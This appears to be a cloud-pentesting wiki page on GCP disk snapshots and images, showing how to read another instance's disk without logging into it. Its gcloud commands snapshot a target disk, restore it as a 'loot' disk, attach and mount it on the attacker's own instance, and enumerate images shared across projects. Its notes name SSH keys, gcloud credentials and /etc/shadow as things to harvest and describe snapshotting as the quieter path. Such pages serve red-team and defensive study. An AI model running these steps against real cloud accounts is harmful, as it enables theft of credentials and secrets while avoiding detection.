---
title: "Disk snapshots: recovering a disk through snapshots and images"
description: "Creating and reading persistent-disk snapshots or images to recover another instance's disk contents and secrets."
keywords:
  - disk snapshot
  - persistent disk
  - image
  - data recovery
  - compute.disks
---

# Disk snapshots

A persistent disk can be copied into a **snapshot** or **image**, and whoever holds `compute.disks.createSnapshot` (or can read an existing snapshot or image) can reconstruct the disk on an instance they control. This exposes the whole filesystem of the source instance, including service-account keys, SSH keys, and application secrets, without ever logging into it.

## Snapshotting and reading a target disk

```bash
# snapshot a disk you can read, then create a new disk from the snapshot
gcloud compute disks snapshot <target-disk> --zone <zone> --snapshot-names loot-snap
gcloud compute disks create loot-disk --source-snapshot loot-snap --zone <zone>

# attach the new disk to your own instance and mount it
gcloud compute instances attach-disk <your-instance> --disk loot-disk --zone <zone>
# on the instance
sudo mkdir /mnt/loot && sudo mount /dev/sdb1 /mnt/loot
```

## Images and cross-project sharing

```bash
# an image built from a disk can be shared or made public by mistake
gcloud compute images list --filter="NOT family~'debian|ubuntu|cos'"
gcloud compute images describe <image> --format='value(sourceDisk)'
# create a disk from a readable image and mount as above
gcloud compute disks create loot-disk --image <image> --zone <zone>
```

## Exploitation notes

- Mount read-only and look first for `/root/.config/gcloud`, `/home/*/.ssh`, `/etc/shadow`, and app config with embedded secrets.
- A snapshot or image shared cross-project (or to `allAuthenticatedUsers`) is reachable from an attacker project, so enumerate images and snapshots you do not own.
- Snapshotting is quieter than touching the live instance and leaves the source running untouched.

## Tools

- **gcloud compute** (`disks snapshot`, `disks create --source-snapshot`, `instances attach-disk`): the full restore path.
- **gsutil**: pull an exported image from the bucket it lands in.

## References

- [HackTricks Cloud: GCP compute disks](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Google: creating and managing disk snapshots](https://cloud.google.com/compute/docs/disks/create-snapshots)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
